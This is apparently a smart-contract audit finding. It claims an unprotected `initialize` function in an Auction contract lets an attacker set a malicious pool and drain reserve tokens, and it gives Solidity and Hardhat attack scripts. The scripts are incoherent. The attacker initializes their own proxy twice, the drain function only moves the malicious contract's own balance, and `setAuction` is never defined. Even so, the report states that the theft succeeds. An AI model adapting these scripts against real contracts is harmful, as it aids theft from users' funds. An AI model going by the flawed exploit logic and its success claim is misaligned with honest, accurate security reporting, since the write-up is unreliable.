# Auction Takeover and Funds Draining

### Summary



The `initialize` function in `Auction.sol` allows any address to set the `pool` variable without restrictions. This lack of access control can enable malicious actors to initialize the contract with a harmful `pool` address, compromising auction operations.



### Root Cause

The `initialize` function is `public` and lacks access control, allowing anyone to call it and set `pool = msg.sender`.

### Attack Path



####  Step 1: Deploy a Malicious Pool Contract

The attacker first deploys a malicious contract designed to manipulate or drain funds from the `Auction` contract once it is set as the `pool`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousPool {
    address public auction;

    constructor(address _auction) {
        auction = _auction;
    }

    // Example malicious function to drain reserve tokens
    function drainFunds(address reserveToken) external {
        IERC20(reserveToken).transfer(msg.sender, IERC20(reserveToken).balanceOf(address(this)));
    }

    // Additional malicious functionalities as needed
}
```

#### Step 2: Deploy the `Auction` Proxy Contract

The attacker deploys an `Auction` proxy pointing to the vulnerable `Auction.sol` implementation.

```solidity
// Using Hardhat or Truffle Framework

const { ethers, upgrades } = require("hardhat");

async function main() {
    const [attacker] = await ethers.getSigners();

    // Deploy MaliciousPool
    const MaliciousPool = await ethers.getContractFactory("MaliciousPool");
    const maliciousPool = await MaliciousPool.deploy(/* Auction address will be set later */);
    await maliciousPool.deployed();
    console.log("MaliciousPool deployed at:", maliciousPool.address);

    // Deploy Auction Proxy
    const Auction = await ethers.getContractFactory("Auction");
    const auctionProxy = await upgrades.deployProxy(Auction, [
        /* _buyCouponToken */,
        /* _sellReserveToken */,
        /* _totalBuyCouponAmount */,
        /* _endTime */,
        /* _maxBids */,
        /* _beneficiary */,
        /* _poolSaleLimit */
    ], { initializer: 'initialize' });
    await auctionProxy.deployed();
    console.log("Auction Proxy deployed at:", auctionProxy.address);

    // Update MaliciousPool with Auction address
    await maliciousPool.setAuction(auctionProxy.address);
}
```


####  Step 3: Initialize the `Auction` Proxy with Malicious `pool` Address

Since the `initialize` function is unrestricted, the attacker can call it to set the `pool` address to their malicious contract.

```solidity
// Continuing from the previous script

async function exploit() {
    const [attacker] = await ethers.getSigners();

    // Connect to the Auction proxy as the attacker
    const auctionProxy = await ethers.getContractAt("Auction", "Auction_Proxy_Address_Here", attacker);

    // Call initialize to set pool to MaliciousPool
    await auctionProxy.initialize(
        /* _buyCouponToken */,
        /* _sellReserveToken */,
        /* _totalBuyCouponAmount */,
        /* _endTime */,
        /* _maxBids */,
        /* _beneficiary */,
        /* _poolSaleLimit */
    );
}
```

**Outcome:** After this call, `pool` is set to the attacker's `MaliciousPool` contract.

#### ** Step 4: Exploit the Malicious `pool`**

With the `pool` address now pointing to `MaliciousPool`, the attacker can execute malicious functions to manipulate the auction or drain funds.

```solidity
// Interacting with MaliciousPool to drain funds

async function drainFunds() {
    const [attacker] = await ethers.getSigners();

    const MaliciousPool = await ethers.getContractAt("MaliciousPool", "MaliciousPool_Address_Here", attacker);

    // Call drainFunds to transfer reserve tokens to the attacker
    await MaliciousPool.drainFunds("Reserve_Token_Address_Here");
}
```

**Result:** The attacker successfully transfers reserve tokens from the `Auction` contract to their own address.



### Impact

- **Full Control:** Attackers can manipulate auction functionalities by setting `pool` to a malicious contract.
- **Fund Drain:** Unauthorized transfers and fund withdrawals are possible.
- **Protocol Disruption:** Malicious actions can destabilize auction processes and overall protocol integrity.
- **Loss of Trust:** Users may lose confidence in the platformâ€™s security, leading to decreased participation.


### PoC

   ```solidity
   contract MaliciousPool {
       address public auction;
       constructor(address _auction) { auction = _auction; }
       function drain(address reserveToken) external {
           IERC20(reserveToken).transfer(msg.sender, IERC20(reserveToken).balanceOf(address(this)));
       }
   }
   ```

**Deploy Auction Proxy and Initialize:**
   
   ```solidity
   // Using Hardhat
   const Auction = await ethers.getContractFactory("Auction");
   const auctionProxy = await upgrades.deployProxy(Auction, [/* parameters */], { initializer: 'initialize' });
   await auctionProxy.deployed();
   
   // Initialize with attacker as pool
   await auctionProxy.initialize(/* parameters */, attacker.address);
```


### Mitigation

Implement Access Control.
